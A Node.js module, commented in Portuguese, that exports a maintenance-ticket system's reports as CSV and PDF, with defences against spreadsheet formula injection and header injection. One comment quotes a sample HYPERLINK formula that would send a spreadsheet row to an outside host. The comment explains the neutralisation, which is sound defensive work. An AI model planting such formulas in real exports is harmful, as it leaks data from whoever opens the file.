const PDFDocument = require('pdfkit');
const relatoriosService = require('./relatorios.service');

const ESTADO_ROTULO = {
  aberto: 'Aberto',
  em_triagem: 'Em triagem',
  atribuido: 'Atribuído',
  em_andamento: 'Em andamento',
  aguardando_material: 'Aguardando material',
  concluido: 'Concluído',
  cancelado: 'Cancelado',
};

const PRIORIDADE_ROTULO = {
  baixa: 'Baixa',
  media: 'Média',
  alta: 'Alta',
  critica: 'Crítica',
};

// ---------------------------------------------------------------------------
// Formatação
// ---------------------------------------------------------------------------

// Excel em português lê "12,5" como número e "12.5" como texto (ou como data,
// dependendo do valor). Como o separador de campo aqui é ";", usar vírgula
// decimal não cria ambiguidade e faz a coluna chegar somável do outro lado.
function numero(valor, casas = 2) {
  if (valor === null || valor === undefined) return '';
  return Number(valor).toFixed(casas).replace('.', ',');
}

function inteiro(valor) {
  if (valor === null || valor === undefined) return '';
  return String(valor);
}

function horas(segundos) {
  if (segundos === null || segundos === undefined) return '';
  return numero(Number(segundos) / 3600, 2);
}

function dataHora(valor) {
  if (!valor) return '';
  const d = new Date(valor);
  const doisDigitos = (n) => String(n).padStart(2, '0');
  return (
    `${doisDigitos(d.getDate())}/${doisDigitos(d.getMonth() + 1)}/${d.getFullYear()} ` +
    `${doisDigitos(d.getHours())}:${doisDigitos(d.getMinutes())}`
  );
}

function simNao(valor) {
  if (valor === null || valor === undefined) return '';
  return valor ? 'Sim' : 'Não';
}

// ---------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------

const SEPARADOR = ';';

// Excel, LibreOffice e Planilhas Google tratam um campo iniciado por =, +, -,
// @, TAB ou CR como fórmula, mesmo vindo de um CSV. Um título de chamado como
// =HYPERLINK("http://fora/"&A1) viraria um link que exfiltra a linha inteira
// quando a gestão abrisse a planilha — o conteúdo é escrito por qualquer
// solicitante, então é entrada não confiável como qualquer outra. O apóstrofo
// à frente força a célula a ser texto; o Excel não o exibe.
const INICIO_DE_FORMULA = /^[=+\-@\t\r]/;

function neutralizarFormula(texto) {
  return INICIO_DE_FORMULA.test(texto) ? `'${texto}` : texto;
}

/**
 * Escapa um campo para CSV.
 *
 * `confiavel` marca os valores que este módulo mesmo formatou (datas, números,
 * contagens): esses não passam pela neutralização, senão um tempo negativo
 * legítimo viraria texto. Tudo que veio do banco como texto é entrada de
 * usuário e passa.
 */
function campo(valor, { confiavel = false } = {}) {
  if (valor === null || valor === undefined) return '';

  let texto = String(valor);
  if (!confiavel) texto = neutralizarFormula(texto);

  // Aspas duplas viram duas; o campo só precisa de aspas se contiver
  // separador, aspas ou quebra de linha.
  if (/[";\n\r]/.test(texto)) {
    return `"${texto.replace(/"/g, '""')}"`;
  }
  return texto;
}

/**
 * Colunas da planilha analítica: uma linha por chamado.
 *
 * O grão é o chamado, e não o número consolidado, de propósito. O PDF entrega
 * o consolidado pronto; a planilha existe para que a gestão cruze o que a
 * gente não previu — tudo que está no resumo pode ser recalculado daqui, o
 * contrário não.
 */
const COLUNAS = [
  { rotulo: 'Protocolo', valor: (c) => c.protocolo },
  { rotulo: 'Título', valor: (c) => c.titulo },
  { rotulo: 'Categoria', valor: (c) => c.categoria },
  { rotulo: 'Local', valor: (c) => c.local },
  { rotulo: 'Estado', valor: (c) => ESTADO_ROTULO[c.estado] ?? c.estado, confiavel: true },
  {
    rotulo: 'Prioridade',
    valor: (c) => PRIORIDADE_ROTULO[c.prioridade] ?? c.prioridade,
    confiavel: true,
  },
  {
    rotulo: 'Prioridade sugerida',
    valor: (c) => PRIORIDADE_ROTULO[c.prioridade_sugerida] ?? c.prioridade_sugerida ?? '',
    confiavel: true,
  },
  { rotulo: 'Urgência', valor: (c) => inteiro(c.urgencia), confiavel: true },
  { rotulo: 'Impacto', valor: (c) => inteiro(c.impacto), confiavel: true },
  { rotulo: 'Risco', valor: (c) => inteiro(c.risco), confiavel: true },
  { rotulo: 'Solicitante', valor: (c) => c.solicitante },
  { rotulo: 'Técnico', valor: (c) => c.tecnico ?? '' },
  { rotulo: 'Abertura', valor: (c) => dataHora(c.data_abertura), confiavel: true },
  { rotulo: 'Início da execução', valor: (c) => dataHora(c.inicio_execucao), confiavel: true },
  { rotulo: 'Conclusão', valor: (c) => dataHora(c.data_conclusao), confiavel: true },
  { rotulo: 'Prazo', valor: (c) => dataHora(c.prazo_estimado), confiavel: true },
  {
    rotulo: 'Tempo líquido (h)',
    valor: (c) => horas(c.tempo_liquido_segundos),
    confiavel: true,
  },
  {
    rotulo: 'Tempo suspenso (h)',
    valor: (c) => horas(intervaloEmSegundos(c.tempo_suspenso_total)),
    confiavel: true,
  },
  {
    rotulo: 'Tempo empregado (min)',
    valor: (c) => inteiro(c.tempo_empregado_minutos),
    confiavel: true,
  },
  { rotulo: 'Concluído no prazo', valor: (c) => simNao(c.concluido_no_prazo), confiavel: true },
  { rotulo: 'Em atraso agora', valor: (c) => simNao(c.em_atraso), confiavel: true },
  { rotulo: 'Reaberturas', valor: (c) => inteiro(c.total_reaberturas), confiavel: true },
  { rotulo: 'Nota', valor: (c) => inteiro(c.nota_avaliacao), confiavel: true },
];

// O driver devolve INTERVAL como objeto ({ hours, minutes, ... }), não como
// número de segundos.
function intervaloEmSegundos(intervalo) {
  if (!intervalo) return 0;
  if (typeof intervalo === 'number') return intervalo;

  const { days = 0, hours = 0, minutes = 0, seconds = 0, milliseconds = 0 } = intervalo;
  return days * 86400 + hours * 3600 + minutes * 60 + seconds + milliseconds / 1000;
}

function linha(valores) {
  return `${valores.join(SEPARADOR)}\r\n`;
}

/**
 * Escreve a planilha analítica em `destino` (a resposta HTTP).
 *
 * `aoComecar` é chamado uma vez, imediatamente antes do primeiro byte. É por
 * ele que o controlador põe os cabeçalhos de download: até aqui a consulta
 * ainda pode recusar o período por ser grande demais, e um 422 depois da
 * resposta ter começado chegaria dentro do arquivo baixado em vez de na tela.
 *
 * O BOM inicial é o que faz o Excel abrir o arquivo como UTF-8; sem ele,
 * "manutenção" chega como "manutenÃ§Ã£o" na máquina de quem recebe.
 */
async function chamadosCsv(filtros, destino, aoComecar = () => {}) {
  let comecou = false;
  const comecar = () => {
    if (comecou) return;
    comecou = true;
    aoComecar();
    destino.write('﻿');
    destino.write(linha(COLUNAS.map((c) => campo(c.rotulo, { confiavel: true }))));
  };

  const total = await relatoriosService.percorrerChamados(filtros, (lote) => {
    comecar();
    let bloco = '';
    for (const chamado of lote) {
      bloco += linha(COLUNAS.map((c) => campo(c.valor(chamado), { confiavel: c.confiavel })));
    }
    destino.write(bloco);
  });

  // Período sem nenhum chamado ainda merece o cabeçalho: uma planilha vazia
  // com colunas diz "não houve"; um arquivo de zero byte parece erro.
  comecar();
  return total;
}

// ---------------------------------------------------------------------------
// PDF
// ---------------------------------------------------------------------------

const MARGEM = 48;
const NAVY = '#1B2A4A';
const CINZA = '#555555';

function duracao(segundos) {
  if (segundos === null || segundos === undefined) return '—';
  const s = Number(segundos);
  if (s < 3600) return `${Math.round(s / 60)} min`;
  if (s < 86400) return `${numero(s / 3600, 1)} h`;
  return `${numero(s / 86400, 1)} dias`;
}

function periodoPorExtenso({ de, ate }) {
  if (de && ate) return `Período: ${dataCurta(de)} a ${dataCurta(ate)}`;
  if (de) return `Período: a partir de ${dataCurta(de)}`;
  if (ate) return `Período: até ${dataCurta(ate)}`;
  return 'Período: desde o início dos registros';
}

function dataCurta(iso) {
  const [ano, mes, dia] = String(iso).split('-');
  return `${dia}/${mes}/${ano}`;
}

function titulo(doc, texto) {
  if (doc.y > doc.page.height - MARGEM - 90) doc.addPage();
  doc.moveDown(0.8);
  doc.font('Helvetica-Bold').fontSize(12).fillColor(NAVY).text(texto);
  doc.moveDown(0.3);
}

function nota(doc, texto) {
  doc.font('Helvetica').fontSize(8).fillColor(CINZA).text(texto);
  doc.moveDown(0.2);
}

/**
 * Tabela simples com quebra de página.
 *
 * pdfkit não tem tabela; o que importa aqui é que o cabeçalho reapareça na
 * página seguinte — uma tabela cortada sem cabeçalho obriga quem lê a voltar
 * para descobrir o que é cada coluna.
 */
function tabela(doc, colunas, linhas) {
  const larguraUtil = doc.page.width - MARGEM * 2;
  const larguras = colunas.map((c) => Math.round((c.peso / 12) * larguraUtil));

  const escreverCabecalho = () => {
    const y = doc.y;
    doc.font('Helvetica-Bold').fontSize(8.5).fillColor(CINZA);
    let x = MARGEM;
    colunas.forEach((c, i) => {
      doc.text(c.rotulo, x, y, { width: larguras[i], align: c.alinhar || 'left' });
      x += larguras[i];
    });
    doc.y = y + 14;
    doc
      .moveTo(MARGEM, doc.y - 4)
      .lineTo(doc.page.width - MARGEM, doc.y - 4)
      .strokeColor('#DDDDDD')
      .stroke();
  };

  escreverCabecalho();

  for (const valores of linhas) {
    if (doc.y > doc.page.height - MARGEM - 24) {
      doc.addPage();
      escreverCabecalho();
    }
    const y = doc.y;
    doc.font('Helvetica').fontSize(9).fillColor('#222222');
    let x = MARGEM;
    valores.forEach((valor, i) => {
      doc.text(String(valor ?? ''), x, y, {
        width: larguras[i],
        align: colunas[i].alinhar || 'left',
        ellipsis: true,
        height: 12,
      });
      x += larguras[i];
    });
    doc.y = y + 14;
  }
  doc.x = MARGEM;
}

function cartoes(doc, itens) {
  const y = doc.y;
  const largura = (doc.page.width - MARGEM * 2) / itens.length;
  itens.forEach((item, i) => {
    const x = MARGEM + largura * i;
    doc.font('Helvetica').fontSize(8).fillColor(CINZA).text(item.rotulo, x, y, { width: largura });
    doc
      .font('Helvetica-Bold')
      .fontSize(15)
      .fillColor(NAVY)
      .text(item.valor, x, y + 11, { width: largura });
  });
  doc.x = MARGEM;
  doc.y = y + 34;
}

/**
 * Monta o relatório consolidado e devolve o documento, já pronto para ser
 * canalizado para a resposta.
 *
 * O documento carrega quem o emitiu e quando: um PDF que circula por e-mail
 * perde o contexto da tela onde foi gerado, e sem período e origem impressos
 * dois relatórios iguais na aparência podem ser de recortes diferentes.
 */
async function resumoPdf(filtros, { emitidoPor }) {
  const [resumo, desempenho, tecnicos] = await Promise.all([
    relatoriosService.resumo(filtros),
    relatoriosService.desempenho(filtros),
    relatoriosService.porTecnico(filtros),
  ]);

  const doc = new PDFDocument({ size: 'A4', margin: MARGEM, bufferPages: true });

  doc.font('Helvetica-Bold').fontSize(17).fillColor(NAVY).text('Relatório de manutenção predial');
  doc.font('Helvetica').fontSize(9).fillColor(CINZA).text(periodoPorExtenso(filtros));
  doc.text(`Emitido em ${dataHora(new Date())} por ${emitidoPor}.`);
  doc.moveDown(0.8);

  cartoes(doc, [
    { rotulo: 'Total', valor: String(resumo.totais.total) },
    { rotulo: 'Em aberto', valor: String(resumo.totais.em_aberto) },
    { rotulo: 'Concluídos', valor: String(resumo.totais.concluidos) },
    { rotulo: 'Cancelados', valor: String(resumo.totais.cancelados) },
  ]);

  titulo(doc, 'Indicadores');
  nota(
    doc,
    'Os tempos descontam o período em "aguardando material", que é espera por insumo e não trabalho da equipe.'
  );
  cartoes(doc, [
    { rotulo: 'Triagem', valor: duracao(desempenho.marcos.tempo_triagem_segundos) },
    { rotulo: 'Até atendimento', valor: duracao(desempenho.marcos.tempo_ate_atendimento_segundos) },
    { rotulo: 'Execução', valor: duracao(desempenho.marcos.tempo_execucao_segundos) },
    { rotulo: 'Resolução (média)', valor: duracao(desempenho.geral.tempo_medio_segundos) },
  ]);
  cartoes(doc, [
    {
      rotulo: 'Dentro do prazo',
      valor:
        desempenho.prazo.percentual_no_prazo === null
          ? '—'
          : `${desempenho.prazo.percentual_no_prazo}%`,
    },
    { rotulo: 'Atrasados agora', valor: String(desempenho.prazo.em_aberto_atrasados) },
    {
      rotulo: 'Satisfação',
      valor: desempenho.avaliacoes.nota_media
        ? `${numero(desempenho.avaliacoes.nota_media, 1)} / 5`
        : '—',
    },
    { rotulo: 'Avaliações', valor: String(desempenho.avaliacoes.total_avaliacoes) },
  ]);

  titulo(doc, 'Por estado');
  tabela(
    doc,
    [
      { rotulo: 'Estado', peso: 8 },
      { rotulo: 'Chamados', peso: 4, alinhar: 'right' },
    ],
    resumo.por_estado.map((l) => [ESTADO_ROTULO[l.estado] ?? l.estado, l.total])
  );

  titulo(doc, 'Por categoria');
  tabela(
    doc,
    [
      { rotulo: 'Categoria', peso: 8 },
      { rotulo: 'Chamados', peso: 4, alinhar: 'right' },
    ],
    resumo.por_categoria.map((l) => [l.categoria, l.total])
  );

  titulo(doc, 'Por prioridade');
  tabela(
    doc,
    [
      { rotulo: 'Prioridade', peso: 8 },
      { rotulo: 'Chamados', peso: 4, alinhar: 'right' },
    ],
    resumo.por_prioridade.map((l) => [PRIORIDADE_ROTULO[l.prioridade] ?? l.prioridade, l.total])
  );

  titulo(doc, 'Por local');
  nota(doc, 'Os 20 locais com mais chamados no período.');
  tabela(
    doc,
    [
      { rotulo: 'Local', peso: 6 },
      { rotulo: 'Total', peso: 2, alinhar: 'right' },
      { rotulo: 'Em aberto', peso: 2, alinhar: 'right' },
      { rotulo: 'Atrasados', peso: 2, alinhar: 'right' },
    ],
    resumo.por_local.map((l) => [l.local, l.total, l.em_aberto, l.atrasados])
  );

  titulo(doc, 'Carga por técnico');
  if (tecnicos.length === 0) {
    nota(doc, 'Nenhum chamado atribuído no período.');
  } else {
    tabela(
      doc,
      [
        { rotulo: 'Técnico', peso: 5 },
        { rotulo: 'Atribuídos', peso: 2, alinhar: 'right' },
        { rotulo: 'Concluídos', peso: 2, alinhar: 'right' },
        { rotulo: 'Em aberto', peso: 1.5, alinhar: 'right' },
        { rotulo: 'Tempo médio', peso: 1.5, alinhar: 'right' },
      ],
      tecnicos.map((t) => [
        t.nome,
        t.atribuidos,
        t.concluidos,
        t.em_aberto,
        duracao(t.tempo_medio_segundos),
      ])
    );
  }

  const paginas = doc.bufferedPageRange();
  for (let i = 0; i < paginas.count; i += 1) {
    doc.switchToPage(i);

    // O rodapé fica fora da área útil, e escrever abaixo da margem inferior
    // faz o pdfkit entender que a página transbordou e criar outra — o
    // documento saía com o dobro de páginas, metade em branco, e a numeração
    // impressa nas erradas. Zerar a margem de baixo só enquanto se escreve o
    // rodapé é o que evita isso.
    doc.page.margins.bottom = 0;
    doc
      .font('Helvetica')
      .fontSize(8)
      .fillColor(CINZA)
      .text(`Página ${i + 1} de ${paginas.count}`, MARGEM, doc.page.height - 30, {
        width: doc.page.width - MARGEM * 2,
        align: 'right',
      });
    doc.page.margins.bottom = MARGEM;
  }

  doc.end();
  return doc;
}

/**
 * Nome de arquivo seguro para o cabeçalho Content-Disposition.
 *
 * Aspas e quebras de linha no nome permitiriam fechar o cabeçalho e injetar
 * outro; o período vem da query, que é de quem chama.
 */
function nomeDoArquivo(prefixo, filtros, extensao) {
  const trecho = [filtros.de, filtros.ate].filter(Boolean).join('_a_');
  const bruto = trecho ? `${prefixo}_${trecho}` : prefixo;
  return `${bruto.replace(/[^A-Za-z0-9_-]/g, '')}.${extensao}`;
}

module.exports = {
  chamadosCsv,
  resumoPdf,
  nomeDoArquivo,
  // Exportados para teste: são as duas regras que, se quebrarem, quebram em
  // silêncio dentro de um arquivo que ninguém relê.
  campo,
  COLUNAS,
};
